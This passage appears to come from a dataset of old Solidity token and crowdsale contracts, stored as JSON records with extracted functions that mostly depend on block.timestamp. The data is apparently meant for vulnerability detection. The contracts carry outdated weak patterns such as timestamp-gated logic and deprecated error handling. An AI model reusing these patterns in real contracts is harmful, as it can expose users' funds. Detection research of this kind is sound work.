address(0) && gameOpponent == msg.sender);\n if (msg.value > 0 && totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n endGameInternal();\n }\n}",
  "extract_feature": [
    "function transfer(address _to, uint256 _value) public returns (bool) {\nif (_to != address(this)) {\nreturn super.transfer(_to, _value);\n}\nrequire(_value <= balances_[msg.sender] && status == 0);\nif (gameTime > 1514764800) {\nrequire(gameTime - 300 > block.timestamp);\n}\nbalances_[msg.sender] = balances_[msg.sender].sub(_value);\ntotalSupply_ = totalSupply_.sub(_value);\nuint256 weiAmount = price.mul(_value);\nmsg.sender.transfer(weiAmount);\nemit Transfer(msg.sender, _to, _value);\nemit Sell(_to, msg.sender, _value, weiAmount);\nreturn true;\n}",
    "function finish() onlyOwner public {\nrequire(block.timestamp >= finishTime);\nfeeOwner.transfer(address(this).balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ebb"
  },
  "filename": "10250.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ebc"
  },
  "filename": "10253.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => 